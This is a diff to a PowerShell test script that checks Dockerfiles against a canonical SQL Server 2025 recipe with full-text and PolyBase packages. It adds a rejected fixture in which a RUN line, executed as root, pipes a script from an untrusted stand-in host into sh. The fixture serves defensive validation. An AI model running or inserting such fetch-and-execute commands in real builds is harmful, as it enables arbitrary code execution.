@@ -40,42 +40,44 @@ function Normalize-DockerfileSource {
     # Strip Dockerfile comment lines, then flatten only explicit continuations.
     $normalizedLineEndings = $Text -replace "\r\n?", "`n"
     $withoutComments = $normalizedLineEndings -replace '(?m)^[ \t]*#.*(?:\n|$)', ''
-    return $withoutComments -replace '\\\n[ \t]*', ' '
+    return $withoutComments -replace '[ \t]*\\\n[ \t]*', ' '
 }
 function Test-CanonicalSql2025DockerRecipe {
     param([AllowEmptyString()][string]$DockerfileText)
 
     $source = Normalize-DockerfileSource -Text $DockerfileText
-    $officialListUrl = 'https://packages.microsoft.com/config/ubuntu/24.04/mssql-server-2025.list'
-    $listPath = '/etc/apt/sources.list.d/mssql-server-2025.list'
-    $fromPattern = '(?m)^[ \t]*FROM[ \t]+mcr\.microsoft\.com/mssql/server:2025-latest[ \t]*$'
-    $rootUserPattern = '(?m)^[ \t]*USER[ \t]+root[ \t]*$'
-    $curlPattern = '(?m)^[ \t]*RUN[ \t]+curl[ \t]+-fsSL[ \t]+'
-    $curlPattern += [regex]::Escape($officialListUrl)
-    $curlPattern += '[ \t]+-o[ \t]+' + [regex]::Escape($listPath) + '[ \t]*$'
-    $installPattern = '(?m)^[ \t]*RUN[ \t]+apt-get[ \t]+install[ \t]+-y[ \t]+--no-install-recommends[ \t]+mssql-server-fts[ \t]+mssql-server-polybase[ \t]*$'
-    $cleanupPattern = '(?m)^[ \t]*RUN[ \t]+rm[ \t]+-rf[ \t]+/var/lib/apt/lists/\*[ \t]*$'
-    $mssqlUserPattern = '(?m)^[ \t]*USER[ \t]+mssql[ \t]*$'
-    $anyUserPattern = '(?m)^[ \t]*USER[ \t]+\S+[ \t]*$'
-    $anyFromPattern = '(?m)^[ \t]*FROM[ \t]+\S+'
+    $expectedInstructions = @(
+        [pscustomobject]@{ Keyword = 'FROM'; Arguments = 'mcr.microsoft.com/mssql/server:2025-latest' }
+        [pscustomobject]@{ Keyword = 'USER'; Arguments = 'root' }
+        [pscustomobject]@{ Keyword = 'RUN'; Arguments = 'curl -fsSL https://packages.microsoft.com/config/ubuntu/24.04/mssql-server-2025.list -o /etc/apt/sources.list.d/mssql-server-2025.list && apt-get update && apt-get install -y --no-install-recommends mssql-server-fts mssql-server-polybase && rm -rf /var/lib/apt/lists/*' }
+        [pscustomobject]@{ Keyword = 'USER'; Arguments = 'mssql' }
+        [pscustomobject]@{ Keyword = 'CMD'; Arguments = '["/opt/mssql/bin/sqlservr"]' }
+    )
+    $actualInstructions = [System.Collections.Generic.List[object]]::new()
 
-    $from = [regex]::Match($source, $fromPattern)
-    $rootUser = [regex]::Match($source, $rootUserPattern)
-    $curl = [regex]::Match($source, $curlPattern)
-    $install = [regex]::Match($source, $installPattern)
-    $cleanup = [regex]::Match($source, $cleanupPattern)
-    $mssqlUser = [regex]::Match($source, $mssqlUserPattern)
-    $userInstructions = [regex]::Matches($source, $anyUserPattern)
-    $fromInstructions = [regex]::Matches($source, $anyFromPattern)
+    foreach ($line in ($source -split "`n")) {
+        $trimmedLine = $line.Trim()
+        if ([string]::IsNullOrWhiteSpace($trimmedLine)) { continue }
 
-    return $from.Success -and $rootUser.Success -and $curl.Success -and
-        $install.Success -and $cleanup.Success -and $mssqlUser.Success -and
-        $userInstructions.Count -gt 0 -and $fromInstructions.Count -eq 1 -and
-        $from.Index -lt $rootUser.Index -and $rootUser.Index -lt $curl.Index -and
-        $curl.Index -lt $install.Index -and $install.Index -lt $cleanup.Index -and
-        $cleanup.Index -lt $mssqlUser.Index -and
-        $mssqlUser.Index -eq $userInstructions[$userInstructions.Count - 1].Index -and
-        $from.Index -eq $fromInstructions[$fromInstructions.Count - 1].Index
+        $match = [regex]::Match($trimmedLine, '^(?<keyword>[A-Za-z]+)(?:[ \t]+(?<arguments>.*))?$')
+        if (-not $match.Success) { return $false }
+
+        $actualInstructions.Add([pscustomobject]@{
+                Keyword = $match.Groups['keyword'].Value.ToUpperInvariant()
+                Arguments = $match.Groups['arguments'].Value.Trim()
+            })
+    }
+
+    if ($actualInstructions.Count -ne $expectedInstructions.Count) { return $false }
+
+    for ($index = 0; $index -lt $expectedInstructions.Count; $index++) {
+        if ($actualInstructions[$index].Keyword -ne $expectedInstructions[$index].Keyword -or
+            $actualInstructions[$index].Arguments -cne $expectedInstructions[$index].Arguments) {
+            return $false
+        }
+    }
+
+    return $true
 }
 
 Write-Host 'SQL Server 2025 module feature coverage (static)'
@@ -266,22 +268,22 @@ else {
 $canonicalDockerRecipe = @'
 FROM mcr.microsoft.com/mssql/server:2025-latest
 USER root
-RUN curl -fsSL https://packages.microsoft.com/config/ubuntu/24.04/mssql-server-2025.list -o /etc/apt/sources.list.d/mssql-server-2025.list
-RUN apt-get install -y --no-install-recommends mssql-server-fts mssql-server-polybase
-RUN rm -rf /var/lib/apt/lists/*
+RUN curl -fsSL https://packages.microsoft.com/config/ubuntu/24.04/mssql-server-2025.list -o /etc/apt/sources.list.d/mssql-server-2025.list && apt-get update && apt-get install -y --no-install-recommends mssql-server-fts mssql-server-polybase && rm -rf /var/lib/apt/lists/*
 USER mssql
+CMD ["/opt/mssql/bin/sqlservr"]
 '@
 $continuedCanonicalDockerRecipe = @'
 FROM mcr.microsoft.com/mssql/server:2025-latest
 USER root
 RUN curl -fsSL \
     https://packages.microsoft.com/config/ubuntu/24.04/mssql-server-2025.list \
-    -o /etc/apt/sources.list.d/mssql-server-2025.list
-RUN apt-get install \
-    -y --no-install-recommends \
-    mssql-server-fts mssql-server-polybase
-RUN rm -rf /var/lib/apt/lists/*
+    -o /etc/apt/sources.list.d/mssql-server-2025.list \
+    && apt-get update \
+    && apt-get install -y --no-install-recommends \
+    mssql-server-fts mssql-server-polybase \
+    && rm -rf /var/lib/apt/lists/*
 USER mssql
+CMD ["/opt/mssql/bin/sqlservr"]
 '@
 $crlfCanonicalDockerRecipe = $canonicalDockerRecipe -replace "`n", "`r`n"
 $dockerFixtures = @{
@@ -376,6 +378,14 @@ RUN apt-get install -y --no-install-recommends mssql-server-fts mssql-server-pol
 RUN rm -rf /var/lib/apt/lists/*
 USER mssql
 FROM ubuntu:24.04
+'@
+    ArbitraryRootRun = @'
+FROM mcr.microsoft.com/mssql/server:2025-latest
+USER root
+RUN curl -fsSL https://untrusted.example/install.sh | sh
+RUN curl -fsSL https://packages.microsoft.com/config/ubuntu/24.04/mssql-server-2025.list -o /etc/apt/sources.list.d/mssql-server-2025.list && apt-get update && apt-get install -y --no-install-recommends mssql-server-fts mssql-server-polybase && rm -rf /var/lib/apt/lists/*
+USER mssql
+CMD ["/opt/mssql/bin/sqlservr"]
 '@
 }
 foreach ($recipe in $canonicalDockerRecipe, $continuedCanonicalDockerRecipe, $crlfCanonicalDockerRecipe) {
